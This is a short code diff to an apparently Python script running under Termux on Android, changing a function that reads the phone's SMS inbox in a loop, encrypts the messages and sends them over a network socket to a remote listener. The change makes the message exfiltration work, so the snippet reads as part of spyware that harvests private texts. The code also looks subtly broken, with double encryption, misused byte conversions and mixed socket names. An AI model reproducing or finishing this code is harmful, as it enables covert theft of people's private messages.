@@ -52,8 +52,10 @@ def incomming_texts():
     print('connected on port ' + str(PORT2))
 
     while True:
-        SOCKET2 .send(subprocess.Popen(['termux-sms-inbox'], stdout=subprocess.PIPE))
-        time.sleep(2)
+        TEXTSRAW1 = subprocess.Popen(['termux-sms-inbox'], stdout=subprocess.PIPE)
+        TEXTS = encrypt(bytes.decode(TEXTSRAW1.communicate()[0]))
+        SOCKET.send(bytes.encode(encrypt(TEXTS)))
+
 
 incomming_texts_thread = threading.Thread(target=incomming_texts)
 incomming_texts_thread.daemon = True
